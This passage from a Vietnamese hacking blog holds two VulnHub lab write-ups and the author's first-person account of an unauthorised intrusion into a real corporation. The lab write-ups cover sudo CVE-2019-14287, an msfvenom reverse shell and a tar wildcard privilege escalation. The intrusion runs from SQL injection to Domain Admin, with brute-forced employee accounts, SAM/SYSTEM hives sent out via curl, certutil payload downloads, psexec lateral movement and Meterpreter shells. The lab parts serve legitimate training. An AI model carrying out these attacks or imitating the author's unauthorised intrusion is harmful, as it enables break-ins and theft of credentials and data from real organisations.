v1.8.21 có một lỗi nghiêm trọng ra phết, được gọi là User -1. CVE-2019-14287.Thử trước đã rồi hiểu nó sau :v\n$ sudo -u#-1 sqlite3 /dev/null &#x27;.shell /bin/sh&#x27;# iduid=0(root) gid=1000(frank) groups=1000(frank)# cd /root# lsmsg.txt  root.txt# cat root.txt96440606fb88aa7497cde5a8e68daf8f# cat msg.txt\t   Congrats on rooting DevGuru!  Contact me via Twitter @zayotic to give feedback!\nSau dấu # là UID của user, đó là cách thứ 2 để chạy lệnh với quyền của một user khác.Vậy tại sao lại là -1, thử -2, -3 xem sao &#x3D;))\n$ sudo -u#-3 sqlite3 /dev/null &#x27;.shell /bin/sh&#x27;sudo: unknown uid 4294967294: who are you?\nHãy để ý con số 4294967294, nó sát với con số 4294967295, hay 2^32-1, là cận trên của kiểu Integer trong C&#x2F;C++&#x2F;Java, bla bla… Điều đó nghĩa là khi nhập số -1 vào đây, hệ điều hành sẽ chuyển toàn bộ 32 bit trong biến UID thành 0, và 1 bit thứ 33 cao nhất là 1, nhưng bit 33 cao nhất này bị tràn ra đâu đó, để lại 32 bit 0, lúc này thì giá trị của biến UID bằng 0. Với UID bằng 0, hệ thống Linux hiểu rằng đó là root.\n# iduid=0(root)\nĐó, vậy là có root.\n","categories":["VulnHub"],"tags":["vulnhub","write up","medium"]},{"title":"[VulnHub] Flick 2","url":"/2021/06/25/flick2-vulnhub/","content":"\nOverviewLink download: FLICK: 2Difficulty: Intermediate (Depends on experience)\n\nIP Victim: 192.168.56.104IP Attacker: 192.167.56.102\nInformation GatheringTrong thư mục đề bài có 3 file gồm:\n\nflick-check-dist.apk\nflickII-dist.ova\nREADME\n\nMục đích của bài là dịch ngược và phân tích mã nguồn của file APK, và dùng cách vi diệu nào đó để tấn công và chiếm quyền điều khiển của máy mục tiêu.Kết quả scan nmap máy mục tiêu đéo đem lại gì khả quan vì nó mở đúng 1 port 443.\n$ nmap -p- -sC -sV 192.168.56.104Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 05:34 EDTNmap scan report for 192.168.56.104Host is up (0.00055s latency).PORT    STATE SERVICE   VERSION443/tcp open  ssl/https nginx/1.6.3|_http-server-header: nginx/1.6.3|_http-title: 400 The plain HTTP request was sent to HTTPS port| ssl-cert: Subject: commonName=flick.local/organizationName=Flick/stateOrProvinceName=North South/countryName=ZA| Not valid before: 2015-06-23T14:43:54|_Not valid after:  2024-09-08T14:43:54|_ssl-date: 2021-06-23T16:34:57+00:00; +6h59m59s from scanner time.| tls-nextprotoneg: |_  http/1.1Host script results:|_clock-skew: 6h59m58sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds\nDễ nhận thấy dịch vụ chạy trêng port 443 HTTPS, là một API service để từ ứng dụng cài đặt từ file APK kia kết nối tới.Cài đặt ứng dụng xem nó làm cái vẹo gì đã.Hmm…Có vẻ như cái app này đang chạy lệnh trực tiếp lên máy mục tiêu, vậy nên nếu tôi biết được API endpoint, tôi cũng có thể thực thi lệnh trực tiếp trên máy mục tiêu, RCE ez!Vấn đề là giờ phải tìm được API endpoint. Xời, đọc mã nguồn thôi!Dùng JADX (https://github.com/skylot/jadx) để decompiler file APK này, tôi nhận được mã nguồn ở dạng code Java cực kỳ dễ đọc. (Repo hơn 26k star Github có khác, uy tín vl).\nSource code analyticsTrong CommandActivity.java, dòng 147, class SSHCommand, có thể nhận thấy task đang thực hiện kết nối SSH để thực hiện lệnh, với user robin, mật khẩu được truyền vào từ hàm validate() dòng 138. Tại hàm validate() có tham số input, khi được gọi, biến được truyền vào là (dòng 33):\nString integrity_check = &quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&quot;;\nCó thể thấy ngay output của hàm validate() chính là mật khẩu của user robin, dễ vl, code lại một chút là lấy được mật khẩu, ez.\nimport java.util.Base64;public class ExploitFlick &#123;     public static void main(String []args)&#123;        String input = &quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&quot;;        String text = new String(Base64.getDecoder().decode(input.getBytes()));        String password = validate(text);        System.out.println(password);     &#125;     public static String validate(String input) &#123;        char[] key = &#123;&#x27;T&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27; &#x27;, &#x27;s&#x27;, &#x27;u&#x27;, &#x27;p&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27; &#x27;, &#x27;s&#x27;, &#x27;e&#x27;, &#x27;c&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;m&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;s&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;!&#x27;&#125;;        StringBuilder output = new StringBuilder();        for (int i = 0; i &lt; input.length(); i++) &#123;            output.append((char) (input.charAt(i) ^ key[i % key.length]));        &#125;        return output.toString();    &#125;&#125;// 40373df4b7a1f413af61cf7fd06d03a565a51898\nLấy được tài khoản trên máy mục tiêu là robin:40373df4b7a1f413af61cf7fd06d03a565a51898Ơ nhưng mà lịt pẹ, máy mục tiêu mở độc 1 port duy nhất là 443, có thông tin đăng nhập SSH cũng không đăng nhập được vì dịch vụ SSH không mở :&#x2F;Ngán ngẩm quay lại với đống mã nguồn…Tại dòng 41, trong hàm onCreate() file DoRegisterActivity.java, có thể thấy một endpoint cho phép đăng ký thiết bị.Kéo xuống một chút, sau khi đã biết được endpoint, giờ thì phải xem API endpoint này yêu cầu những param gì, method gì,… mất khoảng 30s ngắm nghía, tôi nhận ra endpoint này chỉ yêu cầu mỗi param uuid và dữ liệu gửi lên dạng JSON với phương thức POST.He, mở Postman lên bắn request luôn.\nPostmanOkay, reponse trả về cho thấy có vẻ tôi đã đăng ký thiết bị thành công vớiUUID = 1, token = FmOBOJSrsOw8aaCZtrT1Ro1DSPBRSE11Giờ thì phải tìm hiểu xem cái token mà máy chủ dịch vụ cấp cho tôi được dùng để làm việc gì.Ngồi ngâm code và uống C sủi, nhận thấy một endpoint cho phép thực thi lệnh trong CommandActivity.java, có thể đây chính là endpoint mà app đã dùng để thực thi lệnh, với các param header X-UUID và X-TOKEN, 2 param header này chính là UUID và token mà tôi đã có ở trên. Lệnh thực thi được mã hoá với base64 và nối vào cuối URI.Bây giờ tôi sẽ thử thực thi lệnh id có mã base64 là aWQ=.Ngon luôn!Giờ thì xem xem trên máy mục tiêu có python không, để chạy lệnh và lấy reverse shell.which python\n&#123;    &quot;status&quot;: &quot;error&quot;,    &quot;output&quot;: &quot;Command &#x27;which python&#x27; contains a banned command.&quot;&#125;\nẦu men, câu lệnh bị chặn cmnr. Có thể là chặn theo Black list, vì các lệnh như w, lscpu, id, free, ping, curl, cp vẫn có thể thực hiện ngon lành. Kệ đi, tạo reverse shell ELF rồi tải vào máy mục tiêu cái đã. Với lệnh lscpu, có thể nhận thấy máy chủ đang chạy là Linux x64.\nCommand Execution to nginx shellTạo một file thực thi để lấy reverse shell.\n$ msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.56.102 -f elf -o duma443.elf\nChạy HTTP server trên máy của tôi và thực thi lệnh curl trên máy mục tiêu để lấy file duma443.elf về máy mục tiêu.Có request từ máy mục tiêu (IP 192.168.56.104)Set quyền thực thi cho file /tmp/duma443.elf, nhưng…\n&#123;    &quot;status&quot;: &quot;error&quot;,    &quot;output&quot;: &quot;Command &#x27;chmod +x /tmp/duma443.elf&#x27; contains a banned command.&quot;&#125;\nMẹ nó, chmod nằm trong Black list.Vuốt râu một lúc, tôi nhận ra là tôi đang không biết máy mục tiêu đang chặn lệnh thực thi như thế nào? Có thật là Black list? Hay dùng regex để detect ra chuỗi có trong Black list? Có một cách để biết được điều này, là thử dùng đường dẫn tuyệt đối.Bây giờ không dùng chmod nữa, mà dùng /usr/bin/chmod, nếu lệnh /usr/bin/chmod vẫn bị ban, thì có nghĩa là API endpoint đang detect theo regex, nhưng nếu không bị ban, thì có lẽ API endpoint chỉ đang chặn theo word. Try it!/usr/bin/chmod +x /tmp/duma443.elfChặn gà vl!Bậy lắng nghe trên port 443 và lấy reverse shell./tmp/duma443.elf\n$ nc -lnvp 443              Ncat: Version 7.91 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 192.168.56.104.Ncat: Connection from 192.168.56.104:52785.bash-4.2$ ididuid=998(nginx) gid=997(nginx) groups=997(nginx)\nSử dụng thông tin đăng nhập vào user robin đã lấy được ở trên, login vào.\nPrivilege Escalationnginx to robinbash-4.2$ su robinsu robinPassword: 40373df4b7a1f413af61cf7fd06d03a565a51898[robin@fII public]$ ididuid=1000(robin) gid=1000(robin) groups=1000(robin)[robin@fII public]$ sudo -lsudo -l[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898Matching Defaults entries for robin on this host:    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, env_keep+=LD_PRELOAD,    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser robin may run the following commands on this host:    (bryan) /usr/local/bin/dice\nUser robin có thể chạy /usr/local/bin/dice với quyền của bryan, thêm nữa là cả env_keep+=LD_PRELOAD, mèn ơi… leo lên quyền của bryan thôi.\nrobin to bryanLeo thang đặc quyền với LD_PRELOADhttps://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/\n[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/home/robin/s.so /usr/local/bin/dice[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898sh-4.2$ bash[bryan@fII robin]$ iduid=1001(bryan) gid=1001(bryan) groups=1001(bryan)\nTải linpeas vào máy mục tiêu, kết quả cho ra có đoạn:Với linpeas, để ý thấy /usr/local/bin/backup được lập lịch chạy lúc 23h hàng ngày, kiểm tra thông tin về file này và chạy xem nó ra cái gì…\n[bryan@fII ~]$ file /usr/local/bin/backup/usr/local/bin/backup: setuid ELF 64-bit LSB shared object, x86-64,version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32,BuildID[sha1]=0xc3cbb4476467a324fd93e428225dbedb5df5e2d3, not stripped[bryan@fII ~]$ /usr/local/bin/backup * Securing environment * Performing database backup...app/app/.gitignoredatabase.sqliteframework/framework/cache/framework/cache/.gitignoreframework/sessions/framework/sessions/.gitignoreframework/views/framework/views/.gitignorelogs/logs/.gitignorelogs/lumen.log * Backup done!\nHmm… có vẻ như /usr/local/bin/backup đang thực hiện nén hết cái list file và folder kia vào đâu đấy, nhưng đâu là đâu?\n[bryan@fII ~]$ strings /usr/local/bin/backup/lib64/ld-linux-x86-64.so.2libc.so.6putssetresgidsetresuidsystem__cxa_finalize__libc_start_main_edata__bss_start_end_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.55B       %D       %B       %:       %2       %*       %&quot;       fffff.[]A\\A]A^A_ * Securing environment * Backup done! * Performing database backup...PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +&quot;%Y%m%d&quot;).tar.gz *;;*3$&quot;\nÈn, câu lệnh dưới cùng dễ thấy ngay /usr/local/bin/backup nén toàn bộ thư mục /usr/share/nginx/serverchecker/storage vào /home/sean/backup_$(/bin/date +&quot;%Y%m%d&quot;).tar.gz &#x3D;)) nảy ngay đến một từ khoá trong đầu, Wildcard!\nbryan to seanhttps://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/Khi truy cập vào đường dẫn /usr/share/nginx/serverchecker/storage, thư mục này là của user nginx, các user khác đéo có quyền ghi vào đây, ờ, thế à, thế giờ tôi sẽ set luôn permission 777 cho cái thư mục này với Postman, vì low-shell đầu tiên được chạy bởi user nginx.Giờ thì các user khác thoải mái đọc ghi luôn :D exploit leo quyền!\n[bryan@fII storage]$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh -p&quot;[bryan@fII storage]$ echo &quot;&quot; &gt; --checkpoint=1[bryan@fII storage]$ ls -altotal 24drwxrwxrwx.  5 nginx nginx 4096 Jun 25 19:24 .drwxrwxrwx. 10 nginx nginx 4096 Jun 22  2015 ..drwxrwxrwx.  2 nginx nginx   23 Jun 22  2015 app-rw-rw-r--   1 bryan bryan    1 Jun 25 19:24 --checkpoint=1-rw-rw-r--   1 bryan bryan    1 Jun 25 19:24 --checkpoint-action=exec=sh -p-rwxrwxrwx.  1 nginx nginx 6144 Jun 25 16:42 database.sqlitedrwxrwxrwx.  5 nginx nginx   45 Jun 22  2015 frameworkdrwxrwxrwx.  2 nginx nginx   39 Jun 22  2015 logs[bryan@fII storage]$ /usr/local/bin/backup * Securing environment * Performing database backup...app/app/.gitignoredatabase.sqliteframework/framework/cache/framework/cache/.gitignoresh-4.2$ iduid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)\nCó shell của sean, tiếp tục để đạt cảnh giới cuối cùng của bài này là root.\nsean to rootTrong thư mục /usr/local/bin/ có file restore được set SUID root, và có group sean, như vậy user sean có thể chạy file restore với quyền root. Nếu exploit được đoạn này, tôi có thể có quyền root.\nbash-4.2$ cd /usr/local/bin/bash-4.2$ ls -altotal 1960drwxr-xr-x.  2 root root       59 Aug 17  2015 .drwxr-xr-x. 12 root root     4096 Jun 22  2015 ..-rwsr-x---.  1 sean bryan    8830 Jul  2  2015 backup-rwxr-xr-x.  1 root root  1107672 Jun 22  2015 composer-rwx--x--x.  1 root root     8830 Jul  2  2015 dice-rwsr-x---   1 root sean   866169 Aug 15  2015 restore\nNhưng tôi đéo :)) làm đến đây tạm tịt. Update sau…\n","categories":["VulnHub"],"tags":["vulnhub","write up","easy"]},{"title":"[Talk] Tôi đã chiếm Domain Admin (AD) một tập đoàn cỡ 15000 tỷ như thế nào?","url":"/2023/07/07/from-sqli-to-domain-admin/","content":"Hành trình leo thang từ SQL Injection đến Domain Admin (AD) take over. Con số 15000 tỷ là tôi để giật tít thôi, nó là con số mà một tờ báo tài chính đếch nào đấy định giá tôi vô tình tìm được. Tóm lại là to, nhưng cái cách mà họ phản ứng lại với việc bị tấn công mạng thì…\n\nĐã hơn một năm kể từ khi tôi gửi phát hiện của mình cho phía tập đoàn và chẳng gì cả, đúng nghĩa đen, từ phản hồi cho đến khắc phục, chẳng gì cả. Cho nên thì, một vài ảnh PoC dưới đây sẽ là do tôi bịa ra để dễ mô tả, vì vấn đề vẫn còn đó.\nMọi chuyện bắt đầu với một trang Đăng nhập. Đúng rồi đấy, SQL Injection.\nFrom SQL InjectionNó không xảy ra với trường Username hay Password, nó xảy ra trong chức năng ResetPassword và người dùng sẽ nhập Email hay Số điện thoại vào để hệ thống nhận diện và thực hiện các thao tác đổi mật khẩu sau đó.Không mất nhiều thời gian để ném ngay vuln point này vào sqlmap và dump lấy vài thứ. Thậm chí tôi còn có thể thực thi lệnh trên máy chủ Cơ sở dữ liệu này chỉ với việc thêm option --os-shell.Được rồi, dừng lại ở đây, chụp lại mấy cái ảnh làm bằng chứng và soạn một email, gửi, biết đâu lại nhận được gì đó &#x3D;)) nhưng không.Không nhớ lắm, có lẽ là đôi tháng, không một động thái nào được ghi nhận. Đấy là lúc mà tôi nhận ra rằng chính những người vận hành còn chẳng buồn quan tâm đến nó. “Thôi được rồi.”, cái máu Red Team của tôi, để xem làm được gì với đống này nào.\nPost ExploitationLấy reverse shell à, không dễ thế, vì máy chủ này không kết nối ra internet. Oẳng. Việc phát động một cuộc tấn công nội bộ vào các máy chủ lân cận chỉ với non-interactive shell như này thì hơi oái oăm.Ý tưởng không mới, vẫn phải cố để tìm kiếm một đường kết nối ra bên ngoài, hoặc một cách thức nào đó để tôi có thể thao tác “thoải mái” hơn. Nếu máy chủ này không kết nối ra internet, vậy còn các máy chủ lân cận thì sao? Và làm thế nào để tôi có thể truy cập hay điều khiển những máy chủ lân cận đó?Giờ tôi cần phải leo thang đặc quyền trên máy chủ này, nó chạy Windows Server 2012.Với đống thông tin systeminfo, nắm được OS đang được cài đặt là bản Windows Server 2012 R2 Standard, kiến trúc x64, không thuộc quản lý bởi Domain và là một máy ảo, cái đáng chú ý nhất là thông tin về những bản cập nhật đã được cài đặt.\nDomain:                    WORKGROUPLogon Server:              N/AHotfix(s):                 140 Hotfix(s) Installed.[01]: KB2868626[02]: KB2883200[03]: KB2887595[04]: KB2894852[05]: KB2894856...[135]: KB4486105[136]: KB4515846[137]: KB4524445[138]: KB4531181[139]: KB4578976[140]: KB5003671\nVới thông tin bản cập nhật cuối cùng, KB5003671, có thể biết được lần cuối máy chủ được cập nhật vào tháng 8&#x2F;2021, tức là khoảng 1 năm trước thời điểm tôi tấn công. Vậy thì tôi sẽ thử nhắm tới những lỗ hổng leo thang đặc quyền có thể ảnh hưởng tới Windows Server 2012 R2 từ cuối 2021.Kiểm tra whoami /priv, SeImpersonatePrivilege Enabled.Nghĩ ngay đến Juicy Potato, thuộc nhà Potatoes &#x3D;)) bạn có thể đọc về những củ khoai tây ở đây.\nhttps://jlajara.gitlab.io/Potatoes_Windows_Privesc\nĐược rồi, nhưng làm thế nào để tôi có thể tải tập tin binary vào máy chủ với cái shell không hoàn chỉnh này? Mã hoá base64 rồi ghi từng đoạn vào một tập tin text sau đó chuyển ngược lại từ base64 sang binary à. Bần cùng thì cũng phải làm cách đó, nhưng sẽ rất mất thời gian, vì còn những tập tin với kích thước cả megabyte. Máy chủ cũng không kết nối ra Internet để có thể tải. Chà. Nhưng biết đâu nó sẽ kết nối đến những máy chủ khác trong mạng nội bộ của nó, khả năng rất cao là như thế. Vậy tôi sẽ cần tải những tập tin cần thiết lên một máy chủ nào đó đang public dịch vụ ra internet và nằm trong mạng nội bộ cùng với máy chủ tôi đang có quyền điều khiển.\nFile TransferTôi tìm lại những subdomain sau khi thực hiện recon, tập trung tìm kiếm một dịch vụ nào đó cho phép tôi tải lên tập tin ở bất kỳ định dạng nào. Phần lớn trong số chúng yêu cầu đăng nhập để thực hiện thao tác, sử dụng tài khoản của tổ chức.Với khoảng mấy trăm cái email của nhân viên tôi lấy được từ lỗ hổng SQL Injection, thực hiện crack và brute-force với top 100 mật khẩu phổ biến nhất, và tóm được một vài tài khoản để mật khẩu khá dễ, chưa cần nhờ đến TI - Threat Intelligence.Có được tài khoản, đăng nhập vào một trang tôi đoán là HRM. Tại đây thì có rất nhiều chỗ để có thể upload file, tôi dùng chức năng tạo yêu cầu hỗ trợ với IT-support và tải lên JuicyPotato.exe. Giờ việc tiếp theo là cần sử dụng máy chủ tôi đang có quyền điều khiển để tải về JuicyPotato.exe từ máy chủ HRM.\nThực hiện nslookup với subdomain và thấy địa chỉ IP cục bộ của máy chủ HRM. Có thể việc này sẽ thành công thật.\nnslookup hrm.victimgroup.com.vn\nNghe ổn đấy. Giờ tải tập tin đó về.\ncertutil -urlcache -f https://hrm.victimgroup.com.vn/support/upload_content/JuicyPotato.exe c:\\\\user\\public\\downloads\\JuicyPotato.exedir c:\\\\users\\public\\downloads\nThành công! Có tồn tại JuicyPotato.exe trong thư mục C:\\Users\\Public\\Downloads. Giờ thì chạy lệnh để kiểm tra xem có thể leo thang đặc quyền thành công không.\nPrivileges EscalationC:\\Users\\Public\\Downloads\\JuicyPotato.exe -l 1337 -c &quot;&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;&quot; -p c:\\windows\\system32\\whoami.exe\nNhưng, JuicyPotato.exe không tồn tại nữa. Wtf!? Lúc này tôi mới nhận ra rằng mình đã chưa kiểm tra trên máy chủ SQL này có Anti Virrus hay không, dở rồi. Nhưng thế quái nào trên máy chủ HRM lại không bị xoá?Giờ cần xem mình đang đối mặt với AV nào, kiểm tra các service đang chạy trên máy chủ SQL. Symantec!\nsq query...SERVICE_NAME: SepMasterServiceDISPLAY_NAME: Symantec Endpoint ProtectionTYPE               : 10  WIN32_OWN_PROCESSSTATE              : 4  RUNNING(NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)WIN32_EXIT_CODE    : 0  (0x0)SERVICE_EXIT_CODE  : 0  (0x0)CHECKPOINT         : 0x0WAIT_HINT          : 0x0SERVICE_NAME: SepScanServiceDISPLAY_NAME: Symantec Endpoint Protection Scan ServiceTYPE               : 10  WIN32_OWN_PROCESSSTATE              : 4  RUNNING(NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)WIN32_EXIT_CODE    : 0  (0x0)SERVICE_EXIT_CODE  : 0  (0x0)CHECKPOINT         : 0x0WAIT_HINT          : 0x0SERVICE_NAME: sepWscSvcDISPLAY_NAME: Symantec Endpoint Protection WSC ServiceTYPE               : 10  WIN32_OWN_PROCESSSTATE              : 4  RUNNING(NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)WIN32_EXIT_CODE    : 0  (0x0)SERVICE_EXIT_CODE  : 0  (0x0)CHECKPOINT         : 0x0WAIT_HINT          : 0x0\nKhó mà đoán được Symantec Endpoint này có được cập nhật policy, sample thường xuyên không. Căn cứ vào thời gian uptime của máy chủ SQL này đã khoảng 1 năm trước, cùng với thời điểm hệ điều hành Windows Server 2012 được cập nhật. Tôi đoán Symantec Endpoint cũng được cài đặt và cập nhật từ thời điểm đó, và sau đó bị ngắt kết nối Internet, đại khái vậy. Cho nên tôi cần một cách thức khai thác PE mới hơn JuicyPotato.Được rồi, tra từ điển tối thượng Payloads All The Things.Nên thử!Kiểm tra trên máy chủ SQL có .NET 4.x nhưng không build được. Tôi build trên máy mình, lấy ra efs.exe, và đẩy efs.exe lên máy chủ SQL như cách đã làm với JuicyPotato.exe.\n# .NET 4.xC:\\Windows\\Microsoft.Net\\Framework\\V4.x\\csc.exe EfsPotato.cs\nThực thi, và &#x3D;))Nice. Symantec không phát hiện ra, nó cũng không chặn cái hành vi tôi thực hiện.\nDump CredentialGiờ thì tôi cần trích xuất thông tin tài khoản trên máy chủ này. Biết thừa rằng Symantec sẽ không bỏ qua cho Mimikatz hay Winpeas, cho nên không hơi đâu mà thử. Tôi dùng cách thủ công để dump: “reg save”\n\nVấn đề tiếp theo, làm thế quái nào để tôi lấy được 2 cái tập tin sam và system về bây giờ, nhắc lại là nó vẫn không có kết nối ra Internet và có Symantec Endpoint bảo vệ. Khốn khổ. Cơ mà khả năng Symantec Endpoint sẽ không chặn curl.exe, đó là một binary tiêu chuẩn trên Windows phiên bản mới hơn. Ý tưởng sẽ là dùng curl.exe để gọi API upload file mà tôi đã dùng trước đó trên dịch vụ HRM. Thử xem nào.\nhttps://github.com/arizvisa/windows-binary-tools/blob/master/curl.execurl.exe --versioncurl 7.70.0 (i386-pc-win32) libcurl/7.70.0 SchannelRelease-Date: 2020-06-06Protocols: file ftp ftps http httpsFeatures: AsynchDNS IPv6 Kerberos Largefile NTLM SPNEGO SSL SSPI UnixSockets\nTải lên tập tin sam và system bằng curl.exe với Authorization.\ncurl -X POST -H &quot;Authorization: Bearer &lt;AUTH_TOKEN&gt;&quot; -F &quot;file=@C:/users/public/pictures/sam&quot; https://hrm.victimgroup.com.vn/support/uploadcurl -X POST -H &quot;Authorization: Bearer &lt;AUTH_TOKEN&gt;&quot; -F &quot;file=@C:/users/public/pictures/system&quot; https://hrm.victimgroup.com.vn/support/upload\nHoàn hảo! Tôi chỉ việc lên HRM và tải về. Sau đó thực hiện trích xuất credential và NTLM hash.Được rồi, giờ làm gì với mấy tài khoản này? Hãy để ý vào những tài khoản admin01 admin02 admin03 và admin04. Có một điều mà System Admin hay làm khi triển khai máy chủ ảo, đấy là clone. Clone từ một OS snapshot đã được cấu hình hardening đầy đủ và sau đó sẽ triển khai các dịch vụ tuỳ theo mục đích. Điều ấy có nghĩa là, những máy chủ sẽ có cấu hình giống y hệt nhau, kể cả những tài khoản admin trong máy. Từ giả thiết đấy, tôi đoán chắc 4 tài khoản admin01 admin02 admin03 admin04 cũng sẽ xuất hiện trên đa phần những máy chủ còn lại trong mạng nội bộ.Ý tưởng là tôi sẽ dùng những tài khoản admin này để đăng nhập vào những máy chủ khác trong mạng nội bộ, và biết đâu đó sẽ có máy chủ kết nối ra bên ngoài internet, khi đó tôi có thể thoát khỏi cái cảnh non-interactive shell tù túng này.Crack được 2 trong 4 tài khoản admin ở trên, không khó, ném NTLM hash lên hashes.comTại sao lại phải crack mà không dùng luôn NTLM hash attack? :D\nhttps://hashes.com/en/decrypt/hash\nGiờ thì tải vào máy chủ SQL psexec.exe, tải ở đây, hàng chính hãng\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/psexec\nIP local của máy chủ SQL hiện tại là 172.20.x.x, vậy tôi sẽ thử chạy psexec trên dải 172.20.x.0&#x2F;24, hơn 200 lần thử chứ mấy.\npsexec.exe \\\\172.20.x.x -u admin01 -p PassOfAdmin01 -i C:\\windows\\system32\\whoami.exe\nPhải có đến hơn chục máy thực thi lệnh thành công, lưu lại IP của những máy này và thực hiện tiếp psexec để “ping” về máy chủ VPS của tôi, nếu có bất kỳ gói tin ICMP nào được gửi đến, thì có nghĩa máy chủ đó trong mạng nội bộ của tổ chức có thể kết nối ra internet. Và không nằm ngoài dự đoán.Giờ tôi sẽ tải vào những máy này Meterpreter payload để lấy reverse shell xịn. Cẩn thận hơn, tôi đã chạy lệnh “sc query” trên những máy chủ lân cận và phát hiện một vài máy không có Symantec Endpoint hay Anti Virrus nào, kể cả Windows Defender, lại thêm một pha khó hiểu, sao không cài tất?. Anti Virrus nói chung sẽ làm giảm hiệu năng của máy chủ, nếu có một tác nhân nguy hại nào đó được nhận diện, dịch vụ AV sẽ chạy quét để tìm và ngăn chặn mối nguy hại và điều này gây tốn tài nguyên CPU.Được rồi, lấy reverse shell!\nGet Reverse ShellĐoạn này thì không khó nữa, máy chủ HRM cũng không có Symantec Endpoint, tôi đoán vậy, vì khi ném vào đó Meterpreter payload và trước đó là JuicyPotato.exe, nó không bị xoá đi. Kéo payload về những máy không có AV và thực thi, lấy được reverse shell dễ dàng.Giờ thì đã có interactive shell, dừng lại ở đây ấy à, chưa đâu &#x3D;))\nPivot AttackTôi thực hiện quét toàn bộ dải mạng 172.20.0.0&#x2F;16, sử dụng auxiliary&#x2F;scanner của Metasploit. Sau đó sử dùng Crackmapexec để thực thi lệnh và thu thập thông tin từ những máy chủ đó thông qua Socks Proxy. Bài viết về Proxy Tunnel sử dụng Meterpreter&#x2F;Metasploit ở đây.\nhttps://www.offsec.com/metasploit-unleashed/proxytunnels/\nVới thông tin về tên máy, dải IP, tôi bắt đầu ngồi hình dung ra mô hình mạng của cái tập đoàn này. Những máy chủ tôi đang kiểm soát nằm trong vùng mạng PROD (product), vùng mạng này cung cấp các dịch vụ trực tuyến ra ngoài Internet. Sau đó là có vùng mạng UAT (User Acceptance Testing), vùng mạng thực hiện test sản phẩm trước khi đưa lên PROD, vùng mạng DEV và vùng USER (cái này tôi tự đặt tên).Tôi dump toàn bộ hash trên tất cả những máy tôi có quyền, trong số đó có kha khá tài khoản của người dùng do cách đặt username, khả năng cao là những tài khoản Quản trị viên.Và có một vài máy không “nằm” trong domain WORKGROUP. Là domain của tập đoàn. VICTIMGROUP.COM.VN\nTo Domain AdminCấu hình kết nối ở đây thực sự có vấn đề, những môi trường mạng như PROD, UAT, DEV, AD lại thông với nhau. Dễ dàng cho tôi quá.Với một vài tài khoản người dùng, tôi thử dump thông tin LDAP của Domain này và phân tích.Thực ra không mất thời gian phân tích, vì trong số những tài khoản tôi có thì 2 tài khoản thuộc Group Domain Admin. Rồi. Xong.Đoạn này sử dụng https://github.com/SpecterOps/BloodHound thì còn nhanh nữa.Giờ thì muốn làm gì thì làm. Dump toàn bộ NTLM hash của người dùng trong Domain, đem đi crack, và đăng nhập vào Office 365 để đọc mail, truy cập VPN, đăng nhập vào các dịch vụ nội bộ…Về cơ bản, tôi có thể làm mọi thứ với hệ thống này từ xa.\nBe a good man, againTrong thông tin LDAP thu thập được, tôi có số điện thoại CTO của tập đoàn. Vì gửi email vô ích, có thể email tôi gửi đã bị ném sang mục spam tự động mất rồi, nên tôi quyết định gọi điện cho vị CTO.Câu hỏi của vị CTO sau khi nghe tôi nói về những lỗ hổng trên toàn bộ hệ thống, là “Bây giờ anh muốn gì?”. Muốn gì ấy à, họ đang nghĩ tôi đang tống tiền họ &#x3D;))Và sau đó cũng chẳng gì cả, một lần nữa, từ phản hồi cho đến khắc phục, chẳng gì cả.\nLearn somethingMột vài điều mà tôi tự rút ra sau cả tháng chui ra chui vào hệ thống mục tiêu:\n\nNên sử dụng Proxy tunnel của Cobalt Strike, Proxy tunnel của Meterpreter&#x2F;Metasploit rất rất phèn, Proxy bị tắc, phiên Meterpreter cũng tắc theo.\nNếu bạn có tài khoản Domain Admin, bạn có thể dcsync dump ở bất kỳ máy nào trong Domain. Điều này có ích khi tất cả các máy trong Domain đã được cài AV để bảo vệ, bạn chỉ cần dùng máy của mình (không có AV, tất nhiên) và join vào, 